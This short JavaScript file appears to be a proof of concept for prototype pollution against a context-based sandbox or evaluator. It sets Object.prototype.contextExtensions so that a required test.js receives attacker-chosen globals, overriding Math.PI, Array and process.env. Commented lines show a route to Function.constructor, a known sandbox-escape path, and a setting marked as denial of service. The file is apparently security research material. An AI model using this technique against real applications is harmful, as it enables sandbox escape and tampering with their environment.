// Object.prototype.contextExtensions = [
//   //{console: {log: Function.constructor}}
//   //{ Error: Function.constructor }
// ]

//Object.prototype.parsingContext = "any"; //DoS

const newArray = { };
Object.prototype.length = 1;

// we can change constants in global
Object.prototype.contextExtensions = [
  {Math: {PI: '666'}},
  {Array: newArray.constructor},
  {process: {env: {MY_ENV: "attacker_controlled_value"}}}
];


require(`${__dirname}/test.js`)